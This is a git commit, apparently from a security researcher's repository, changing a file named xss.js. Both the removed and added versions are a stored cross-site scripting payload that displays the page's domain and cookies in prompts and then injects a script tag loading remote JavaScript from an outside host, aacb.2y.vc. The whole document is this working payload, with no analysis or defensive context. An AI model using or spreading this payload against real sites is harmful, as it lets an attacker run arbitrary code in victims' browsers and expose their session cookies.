f660b7626de494f15455b3a869bc4dddd93f2c39
am3ez/a <72428471+m3ez@users.noreply.github.com>
2024-09-01 16:21:19 +0700

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,3 +1,11 @@
-prompt("Stored XSS by Supakiad S. (m3ez):", document.domain);
-prompt("Stored XSS Popup Cookies:", document.cookie);
-eval('var a=document.createElement(\'script\');a.src=\'https://aacb.2y.vc\';document.body.appendChild(a)');
+// m3ez.js
+(function() {
+    // Your XSS payload or any other actions
+    prompt("Stored XSS by Supakiad S. (m3ez):", document.domain);
+    prompt("Stored XSS Popup Cookies:", document.cookie);
+
+    // Dynamically load another JavaScript file from aacb.2y.vc
+    var script = document.createElement('script');
+    script.src = 'https://aacb.2y.vc/';  
+    document.head.appendChild(script);
+})();
